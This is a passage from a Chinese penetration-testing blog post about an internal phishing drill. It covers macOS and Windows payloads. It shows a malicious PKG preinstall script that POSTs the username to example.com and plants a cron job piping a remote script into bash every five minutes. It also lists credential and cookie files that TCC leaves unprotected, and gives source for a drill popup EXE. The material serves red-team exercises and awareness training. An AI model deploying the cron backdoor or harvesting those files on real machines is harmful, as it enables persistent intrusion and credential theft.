    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="OS-X的钓鱼实践"><a href="#OS-X的钓鱼实践" class="headerlink" title="OS X的钓鱼实践"></a>OS X的钓鱼实践</h2><p>OS X在实际测试碰到几个问题：</p>
<ul>
<li>比如OS X应该用什么木马平台</li>
<li>PKG安装的时候是以root权限运行的，怎么获取登录的用户名</li>
<li>为啥root反弹的pkg不能查看普通用户的桌面（此处是因为TCC机制）</li>
</ul>
<h3 id="OS-X的恶意PKG"><a href="#OS-X的恶意PKG" class="headerlink" title="OS X的恶意PKG"></a>OS X的恶意PKG</h3><p>PKG的制作最简单的可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/strengthen/p/15933420.html">这篇文章</a>，使用<a target="_blank" rel="noopener" href="http://s.sudre.free.fr/Software/Packages/about.html">Packages</a>，利用preinstall脚本，脚本的代码如下:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>dscacheutil -q group -a name admin<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">users</span><span class="token operator">|</span><span class="token function">cut</span> -d <span class="token string">" "</span> -f <span class="token number">3</span><span class="token variable">)</span></span>
<span class="token function">curl</span> -XPOST https://example.com/osxdata -d <span class="token string">"user=<span class="token environment constant">$USER</span>"</span>
<span class="token function">crontab</span> -l <span class="token operator">></span> /private/tmp/you_have_been_pwn.txt
<span class="token builtin class-name">echo</span> <span class="token string">"*/5 * * * * curl -sSL https://example.com/osxdoor | bash"</span> <span class="token operator">>></span> /tmp/you_have_been_pwn.txt
<span class="token function">crontab</span> /private/tmp/you_have_been_pwn.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>root用户获取普通用户名的方式: <code>USER=$(dscacheutil -q group -a name admin|grep users|cut -d &quot; &quot; -f 3)</code></p>
<h3 id="OS-X下的渗透测试攻击"><a href="#OS-X下的渗透测试攻击" class="headerlink" title="OS X下的渗透测试攻击"></a>OS X下的渗透测试攻击</h3><p>参考下面这几个文章:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/MVb1x-jsSAHu-Bn1sjDXAQ">国护准备之macos攻击</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CwqE0AgpzbUqdmg4R57_zA">MacOS钓鱼实践</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.macoder.tech/macOS-6faf0534323c42259f5277bd95d35c43">打造macOS下最强的微信取证工具</a></li>
</ul>
<p>OSX系统下载一个文件到运行的时候，中间会碰到这几个安全拦截:</p>
<h4 id="Gatekeeper"><a href="#Gatekeeper" class="headerlink" title="Gatekeeper"></a>Gatekeeper</h4><p>Gatekeeper 是一种安全机制，旨在仅允许受信任的应用程序在系统上运行，类似于Windows上的SmartScreen和MOTW。从Internet下载可执行文件时，它们会标有属性com.apple.quarantine，该属性会在文件运行时触发网守。如果可执行文件未经过公证，Gatekeeper 将向用户显示提示，通知他们该文件无法运行，因为它未签名。要运行未签名的可执行文件，用户必须右键单击该文件，然后单击打开，而不是双击。</p>
<p>在验证代码签名后，macOS的内置防病毒软件XProtect将扫描文件中的恶意软件。XProtect使用YARA规则。</p>
<p>最后，如果您想要对应用程序进行公证，您可以注册Apple Developer Program以获得代码签名证书，费用为每年99美元。注册后，您可以签署您的应用程序并将其提交 Apple，在那里它将进行安全扫描并检查其他要求，例如强化运行时（在下一节中介绍）是否已启用。如果您提交恶意软件，Apple的安全扫描可能会忽略它并仍然公证您的应用程序，证书可能很快就会被吊销。</p>
<h4 id="TCC"><a href="#TCC" class="headerlink" title="TCC"></a>TCC</h4><p>Transparency, Consent, and Control(TCC)是在 v10.14+ 中实现的 macOS 隐私功能，当应用程序尝试访问某些资源（例如相机）和某些文件夹（包括 Desktop，Downloads，Documents和驱动器/卷）时，它会提示用户明确授予权限。尝试访问受TCC保护的资源而没有权限可能会有弹框提示，导致用户察觉到shell的存在。以下是一些未受TCC保护的有用文件：</p>
<ul>
<li>主目录中的隐藏文件和文件夹：<code>~/.aws/*</code>、<code>~/.ssh/*</code>、<code>~/.bash_history</code>、<code>~/.zsh_history</code></li>
<li>用户应用程序数据 — <code>〜/Library/Application Support/*</code></li>
<li>Cookie 文件 — <code>~/Library/Application Support/Google/Chrome/Default/Cookies</code> , <code>~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack/Cookies</code></li>
</ul>
<p>系统TCC数据库位于 /Library/Application Support/com.apple.TCC/TCC.db，每个用户都有一个位于 ~/Library/Application Support/com.apple.TCC/TCC.db 的TCC数据库。</p>
<h2 id="Windows下的EXE"><a href="#Windows下的EXE" class="headerlink" title="Windows下的EXE"></a>Windows下的EXE</h2><p>Windows下的Exe有两个功能:</p>
<ol>
<li>执行Exe的时候，获取用户名和主机名，回传发送到服务端</li>
<li>新建一个helo-world的定时任务，在某个时间点执行弹框Exe，弹窗告诉用户被入侵了</li>
</ol>
<p>定时任务直接找CSDN的例子，可以拿来用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--c---">Time Trigger Example (C++</a>，弹窗的Exe代码如下:</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span>

<span class="token comment">// 窗口过程函数</span>
LRESULT CALLBACK <span class="token function">WndProc</span><span class="token punctuation">(</span>HWND hWnd<span class="token punctuation">,</span> UINT msg<span class="token punctuation">,</span> WPARAM wParam<span class="token punctuation">,</span> LPARAM lParam<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
    <span class="token keyword">case</span> WM_PAINT<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        PAINTSTRUCT ps<span class="token punctuation">;</span>
        HDC hdc <span class="token operator">=</span> <span class="token function">BeginPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置字体和颜色</span>
        HFONT hFont <span class="token operator">=</span> <span class="token function">CreateFontW</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> FW_NORMAL<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> DEFAULT_CHARSET<span class="token punctuation">,</span> OUT_DEFAULT_PRECIS<span class="token punctuation">,</span> CLIP_DEFAULT_PRECIS<span class="token punctuation">,</span> DEFAULT_QUALITY<span class="token punctuation">,</span> DEFAULT_PITCH <span class="token operator">|</span> FF_SWISS<span class="token punctuation">,</span> L<span class="token string">"Arial"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SelectObject</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SetTextColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">SetBkColor</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> <span class="token function">RGB</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 绘制文本</span>
        <span class="token keyword">wchar_t</span> text<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token string">"您的电脑已被入侵，请提高信息安全意识，防止钓鱼邮件，ByeBye　:)"</span><span class="token punctuation">;</span>
        RECT rect<span class="token punctuation">;</span>
        <span class="token function">GetClientRect</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">DrawTextW</span><span class="token punctuation">(</span>hdc<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>rect<span class="token punctuation">,</span> DT_CENTER <span class="token operator">|</span> DT_VCENTER <span class="token operator">|</span> DT_SINGLELINE<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token comment">// 清理资源</span>
        <span class="token function">EndPaint</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">DeleteObject</span><span class="token punctuation">(</span>hFont<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">case</span> WM_DESTROY<span class="token operator">:</span>
        <span class="token function">PostQuitMessage</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token function">DefWindowProc</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> wParam<span class="token punctuation">,</span> lParam<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">int</span> WINAPI <span class="token function">wWinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPWSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nCmdShow<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">// 注册窗口类</span>
    WNDCLASSEXW wc <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    wc<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WNDCLASSEXW<span class="token punctuation">)</span><span class="token punctuation">;</span>
    wc<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> WndProc<span class="token punctuation">;</span>
    wc<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>
    wc<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">;</span>
    <span class="token function">RegisterClassExW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>wc<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 创建窗口</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        HWND hWnd <span class="token operator">=</span> <span class="token function">CreateWindowExW</span><span class="token punctuation">(</span>WS_EX_TOPMOST <span class="token operator">|</span> WS_EX_APPWINDOW<span class="token punctuation">,</span> L<span class="token string">"MyWindowClass"</span><span class="token punctuation">,</span> L<span class="token string">"如果有任何问题，请联系安全组 -- By "</span><span class="token punctuation">,</span> WS_OVERLAPPEDWINDOW<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">550</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hInstance<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>hWnd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">MessageBoxW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> L<span class="token string">"Failed to create window"</span><span class="token punctuation">,</span> L<span class="token string">"Error"</span><span class="token punctuation">,</span> MB_OK <span class="token operator">|</span> MB_ICONERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>


        <span class="token comment">// 显示窗口</span>
        <span class="token function">ShowWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">,</span> nCmdShow<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">UpdateWindow</span><span class="token punctuation">(</span>hWnd<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 消息循环</span>
        MSG msg<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">GetMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">DispatchMessageW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上述的Exe编译之后，再新建一个工程，把上面的exe当作资源文件，在运行的时候，释放到特定目录中，定时任务再执行这个文件。</p>

	</div>

	
	<span id="/2023/03/27/pinfish-and-osx-pentest.html" class="leancloud-visitors view" data-flag-title="记一次钓鱼演练和OS X下的渗透技巧">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/03/03/github-trick.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-03-27 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>53</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-article-text">背景</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E7%9A%84%E5%8F%91%E9%80%81"><span class="toc-article-text">钓鱼邮件的发送</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%9B%B8%E8%BF%91%E5%9F%9F%E5%90%8D%E5%8F%91%E9%80%81"><span class="toc-article-text">相近域名发送</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8SendCloud"><span class="toc-article-text">使用SendCloud</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%92%93%E9%B1%BC%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="toc-article-text">钓鱼的页面</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81"><span class="toc-article-text">后端代码</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#OS-X%E7%9A%84%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5"><span class="toc-article-text">OS X的钓鱼实践</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#OS-X%E7%9A%84%E6%81%B6%E6%84%8FPKG"><span class="toc-article-text">OS X的恶意PKG</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#OS-X%E4%B8%8B%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%94%BB%E5%87%BB"><span class="toc-article-text">OS X下的渗透测试攻击</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Gatekeeper"><span class="toc-article-text">Gatekeeper</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#TCC"><span class="toc-article-text">TCC</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows%E4%B8%8B%E7%9A%84EXE"><span class="toc-article-text">Windows下的EXE</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
